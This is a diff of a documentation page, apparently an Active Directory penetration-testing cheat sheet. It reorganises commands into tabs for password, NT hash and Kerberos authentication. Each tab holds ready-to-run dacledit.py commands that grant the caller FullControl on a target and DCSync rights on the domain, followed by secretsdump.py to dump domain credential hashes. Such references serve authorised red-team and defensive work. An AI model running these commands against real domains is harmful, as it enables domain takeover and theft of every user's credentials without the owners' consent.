@@ -142,20 +142,48 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Rewrite the DACL on the target object: grant yourself GenericAll or DCSync rights and escalate from there.
 
-```bash wrap
-# Grant GenericAll on a user
-dacledit.py -action write -rights FullControl \
-  -principal $USER -target $TARGET \
-  $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    dacledit.py -action write -rights FullControl \
+      -principal $USER -target $TARGET \
+      $DOMAIN/$USER:$PASSWORD -dc-ip $IP
 
-# Grant DCSync rights on the domain object
-dacledit.py -action write -rights DCSync \
-  -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
-  $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+    dacledit.py -action write -rights DCSync \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      $DOMAIN/$USER:$PASSWORD -dc-ip $IP
 
-# Then run DCSync
-secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP
-```
+    secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    dacledit.py -action write -rights FullControl \
+      -principal $USER -target $TARGET \
+      $DOMAIN/$USER -hashes :$NTHASH -dc-ip $IP
+
+    dacledit.py -action write -rights DCSync \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      $DOMAIN/$USER -hashes :$NTHASH -dc-ip $IP
+
+    secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    dacledit.py -k -no-pass -action write -rights FullControl \
+      -principal $USER -target $TARGET \
+      $DOMAIN/$USER@$DC_HOST
+
+    dacledit.py -k -no-pass -action write -rights DCSync \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      $DOMAIN/$USER@$DC_HOST
+
+    secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+    ```
+  </Tab>
+</Tabs>
 
 ```powershell wrap
 # PowerView alternative
